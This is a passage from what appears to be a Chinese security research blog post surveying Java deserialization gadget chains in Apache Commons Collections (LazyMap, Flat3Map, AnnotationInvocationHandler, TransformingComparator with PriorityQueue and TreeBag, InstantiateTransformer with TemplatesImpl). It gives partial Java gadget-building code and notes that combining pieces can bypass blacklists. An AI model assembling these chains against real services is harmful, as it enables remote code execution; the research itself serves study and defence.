+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map1.put(<span class="hljs-string">&quot;value&quot;</span>,tiedMapEntry);<br>Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; Anotationdeclared = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Target.class, map1);<br></code></pre></td></tr></table></figure>
+
+<h3 id="Flat3Map触发equals"><a href="#Flat3Map触发equals" class="headerlink" title="Flat3Map触发equals"></a>Flat3Map触发equals</h3><p>org.apache.commons.collections.map.Flat3Map#readObject</p>
+<p><img src="image-20240823142441405.png" srcset="/img/loading.gif" lazyload alt="image-20240823142441405"></p>
+<p><img src="image-20240823145130393.png" srcset="/img/loading.gif" lazyload alt="image-20240823145130393"></p>
+<p><img src="image-20240823145138574.png" srcset="/img/loading.gif" lazyload alt="image-20240823145138574"></p>
+<p>可以看到和hashmap一样，所有都能用。</p>
+<p>最后将上面source，flow，sink 一一组合就可以得到一些新gadget。</p>
+<h3 id="AnnotationInvocationHandle触发map-get"><a href="#AnnotationInvocationHandle触发map-get" class="headerlink" title="AnnotationInvocationHandle触发map.get"></a>AnnotationInvocationHandle触发map.get</h3><p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p>
+<p><img src="image-20240823171628559.png" srcset="/img/loading.gif" lazyload alt="image-20240823171628559"></p>
+<p>memberValues可控，map类型. </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; Anotationdeclared =<br>        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, lazymap/DefaultedMap);<br><span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span>Anotationdeclared.newInstance(Override.class, Mapproxy);<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-commons-collections-TransformingComparator-compare"><a href="#0x02-commons-collections-TransformingComparator-compare" class="headerlink" title="0x02 commons.collections (TransformingComparator.compare)"></a>0x02 commons.collections (TransformingComparator.compare)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformingComparator.compare()<br>    ChainedTransformer.transform()<br>            InvokerTransformer.transform()<br>                InstantiateTransformer.transform()<br>                    TemplatesImpl.newTransformer()   <br></code></pre></td></tr></table></figure>
+
+<p>org.apache.commons.collections.comparators.TransformingComparator#compare</p>
+<p><img src="image-20240823152533206.png" srcset="/img/loading.gif" lazyload alt="image-20240823152533206"></p>
+<p>transform这个属性可控。所以需要调用compare</p>
+<p>目前本人收集的</p>
+<h3 id="PriorityQueue触发compare"><a href="#PriorityQueue触发compare" class="headerlink" title="PriorityQueue触发compare"></a>PriorityQueue触发compare</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>);<br>utils.setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>utils.setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, Tcomparator);<br>utils.setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class,<span class="hljs-number">1</span>&#125;);<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="TreeBag触发compare"><a href="#TreeBag触发compare" class="headerlink" title="TreeBag触发compare"></a>TreeBag触发compare</h3><p>org.apache.commons.collections.bag.TreeBag#readObject</p>
+<p><img src="image-20240823153834885.png" srcset="/img/loading.gif" lazyload alt="image-20240823153834885"></p>
+<p><img src="image-20240823153847089.png" srcset="/img/loading.gif" lazyload alt="image-20240823153847089"></p>
+<p>这里map改为TreeMap类型</p>
+<p>java.util.TreeMap#put</p>
+<p><img src="image-20240823153927816.png" srcset="/img/loading.gif" lazyload alt="image-20240823153927816"></p>
+<p>java.util.TreeMap#compare</p>
+<p><img src="image-20240823153936586.png" srcset="/img/loading.gif" lazyload alt="image-20240823153936586"></p>
+<p>compare属性可控</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        TransformingComparator comparator  = new TransformingComparator(chain);</span><br>        <span class="hljs-type">TreeBag</span> <span class="hljs-variable">treeBag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeBag</span>(comparator);<br>        treeBag.add(Runtime.class);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>以上任意组合，就可以得到新gadget。这个点也可以走到cb的gadget（一般cc、cb都有的情况.绕黑名单）。</p>
+<h2 id="0x03-commons-collections-InstantiateTransformer"><a href="#0x03-commons-collections-InstantiateTransformer" class="headerlink" title="0x03 commons.collections (InstantiateTransformer)"></a>0x03 commons.collections (InstantiateTransformer)</h2><p>org.apache.commons.collections.functors.InstantiateTransformer#transform</p>
+<p><img src="image-20240823155348825.png" srcset="/img/loading.gif" lazyload alt="image-20240823155348825"></p>
+<p>鸡肋，只能进行构造函数的实例化。</p>
+<p>目前公开也就TrAXFilter.TrAXFilter()</p>
+<p><img src="image-20240823160442171.png" srcset="/img/loading.gif" lazyload alt="image-20240823160442171"></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">InstantiateTransformer<span class="hljs-selector-class">.transform</span>()<br>	TrAXFilter<span class="hljs-selector-class">.TrAXFilter</span>()<br>    TemplatesImpl<span class="hljs-selector-class">.newTransformer</span>()<br></code></pre></td></tr></table></figure>
+
+<h3 id="map-get-触发InstantiateTransformer"><a href="#map-get-触发InstantiateTransformer" class="headerlink" title="map.get 触发InstantiateTransformer"></a>map.get 触发InstantiateTransformer</h3><p>所以我们只要把前面map.get 触发value.transform改成InstantiateTransformer就完事了</p>
+<h2 id="0x04-commons-collections-InvokerTransformer"><a href="#0x04-commons-collections-InvokerTransformer" class="headerlink" title="0x04  commons.collections (InvokerTransformer)"></a>0x04  commons.collections (InvokerTransformer)</h2><p>没什么好说的，配合ConstantTransformer，ChainedTransformer可以调用任意类任意方法。</p>
+<h2 id="0x05-AnnotationInvocationHandle结合TransformedMap触发Transforme"><a href="#0x05-AnnotationInvocationHandle结合TransformedMap触发Transforme" class="headerlink" title="0x05 AnnotationInvocationHandle结合TransformedMap触发Transforme"></a>0x05 AnnotationInvocationHandle结合TransformedMap触发Transforme</h2><p>可惜setValue里面不可控，组装起来不怎么顺畅。(不能直接InstantiateTransformer，InvokerTransformer)</p>
+<p><img src="image-20240823165115069.png" srcset="/img/loading.gif" lazyload alt="image-20240823165115069"></p>
+<p>TransformedMap父类AbstractInputCheckedMapDecorator.MapEntry#setValue&#x2F;EntrySet</p>
+<p><img src="image-20240823164127407.png" srcset="/img/loading.gif" lazyload alt="image-20240823164127407"></p>
+<p><img src="image-20240823164138048.png" srcset="/img/loading.gif" lazyload alt="image-20240823164138048"></p>
+<p>对parent完成赋值</p>
+<p><img src="image-20240823163721352.png" srcset="/img/loading.gif" lazyload alt="image-20240823163721352"></p>
+<p><img src="image-20240823163741815.png" srcset="/img/loading.gif" lazyload alt="image-20240823163741815"></p>
+<p>最后完成触发。</p>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>​		主要就是找到相应的出发点，然后找新的出发点。然后可以结合<strong>ChainedTransformer调用InvokerTransformer</strong> 访问任意类任意方法 或者 <strong>InstantiateTransformer结合TrAXFilter</strong>调用<strong>templateimpl</strong>。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/gadget/" class="print-no-link">#gadget</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>java反序列二周目(一)</div>
+      <div>https://unam4.github.io/2024/08/23/java反序列二周目-一/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/15/java%E4%B8%ADjs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/" title="java中js命令执行与绕过">
+                        <span class="hidden-mobile">java中js命令执行与绕过</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'unam4/unam4-commect');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
